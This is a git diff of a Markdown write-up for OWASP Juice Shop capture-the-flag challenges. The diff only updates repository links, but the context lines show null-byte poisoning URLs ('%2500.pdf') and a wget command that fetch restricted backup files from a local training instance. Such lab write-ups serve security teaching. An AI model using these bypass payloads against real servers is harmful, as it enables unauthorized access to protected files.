@@ -27,7 +27,7 @@ wget http://127.0.0.1:3000/ftp/coupons_2013.md.bak%2500.pdf
 
 ## Forgotten Developer Backup
 
-As [Forgotten Sales Backup](https://github.com/AlessandroMorelli96/Juice-Shop/blob/master/04_Level4.md#Forgotten-Sales-Backup), but this time we download "package.json.bak".
+As [Forgotten Sales Backup](https://github.com/AlessandroMorelli96/Writeups/blob/master/juice-shop/04_Level4.md#Forgotten-Sales-Backup), but this time we download "package.json.bak".
 
 ```
 http://127.0.0.1:3000/ftp/package.json.bak%2500.pdf
@@ -35,7 +35,7 @@ http://127.0.0.1:3000/ftp/package.json.bak%2500.pdf
 
 ## Easter Egg
 
-As [Forgotten Sales Backup](https://github.com/AlessandroMorelli96/Juice-Shop/blob/master/04_Level4.md#Forgotten-Sales-Backup), but this time we download "eastere.gg".
+As [Forgotten Sales Backup](https://github.com/AlessandroMorelli96/Writeups/blob/master/juice-shop/04_Level4.md#Forgotten-Sales-Backup), but this time we download "eastere.gg".
 
 ```
 http://127.0.0.1:3000/ftp/eastere.gg%2500.pdf
